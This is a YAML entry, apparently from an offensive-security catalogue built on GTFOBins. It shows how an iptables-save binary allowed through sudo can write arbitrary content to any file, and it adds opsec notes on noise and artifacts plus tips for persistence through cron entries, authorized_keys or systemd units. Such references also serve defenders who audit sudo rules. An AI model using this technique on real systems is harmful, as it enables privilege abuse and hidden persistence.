---
name: iptables-save
capabilities:
- write
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: low
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
    iptables -S
    iptables-save -f /path/to/output-file
  notes: The content is written along with a number of `iptables` rules.
references:
- https://gtfobins.github.io/gtfobins/iptables-save/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
